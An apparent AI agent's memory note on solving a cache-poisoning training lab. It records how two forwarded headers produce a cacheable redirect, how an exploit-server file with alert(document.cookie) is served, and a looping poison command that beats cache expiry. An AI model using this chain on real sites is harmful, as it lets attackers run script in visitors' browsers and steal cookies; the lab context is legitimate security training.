---
metadata:
  node_type: memory
name: "PRS arm A lab-web-cache-poisoning-with-multiple-headers"
description: "arm A 基线:lab-web-cache-poisoning-with-multiple-headers 一次通过 - 两头(XFH+XFS:http)拼出 302 到 exploit server 同路径,毒裸 /resources/js/tracking.js 键(需跑赢 max-age=30 过期)后脚本同源执行 alert(document.cookie)"
last_updated: 2026-10-09T12:15:46+08:00
created: 2026-10-09T12:15:46+08:00
---

- 题面(仅题面,未读题解): "A user visits the home page roughly once a minute. To solve, poison the cache with a response that executes alert(document.cookie) in the visitor's browser."
- 机制(实测): 仅 `X-Forwarded-Host: <evil>` → 200 且首页 script src 仍为相对 `/resources/js/tracking.js`(无反射);仅 `X-Forwarded-Scheme: http` → 302 自指同路径;两者同送 → 302 `Location: https://<XFH><原路径><原查询串>`。两个头都不在缓存键内,故该 302 可被缓存复用(响应带 `Cache-Control: max-age=30`)。
- 缓存键: 查询串**在键内**(fresh key `/resources/js/tracking.js?p=1` 头请求 miss→302,随后两条裸请求 hit→302 复现);因此要毒的是受害者会请求的裸路径。
- 攻击链: exploit server 的 File 字段必须**等于重定向落地路径**,故存 `responseFile=/resources/js/tracking.js`,Head `HTTP/1.1 200 OK` + `Content-Type: application/javascript; charset=utf-8`,Body `alert(document.cookie)`;毒 `/resources/js/tracking.js` 得 302 跨源跳到该文件,脚本在**实验室同源**执行 → 翻牌。
- 关键坑: 裸路径已被正常条目占住(hit,age≈16/30),带头的毒请求一样吃 hit。必须**跑赢 30s 过期窗口**: `poison_loop <tracking.js url> --header 'X-Forwarded-Host: ...' --header 'X-Forwarded-Scheme: http' --interval-secs 1 --count 150`(禁用 --bust,否则换键)后台常刷新,受害者一分钟一次 → 约 90s 内 banner is-solved(实测)。
- 件面: `range_launch launch-url <path> --jar /tmp/cj1.json`(reused:false,exploit_server 字段为 null 但实例页里有 Go to exploit server 链接,直接读首页 HTML 取之);`cache_probe` spec = `{base,jar,requests:[{id,method,path|url,headers{},body}]}`,默认加 `Pragma: x-get-cache-key`,但本 lab 缓存不回 X-Cache-Key(只有 `x_cache: hit|miss` 与 age);`http_session post <url> --form ...`(子命令必须打头;STORE 需 urlIsHttps/responseFile/responseHead/responseBody/formAction=STORE,响应体回显所存内容即可自证)。
- 一次通过,无修正轮。零 git 提交。

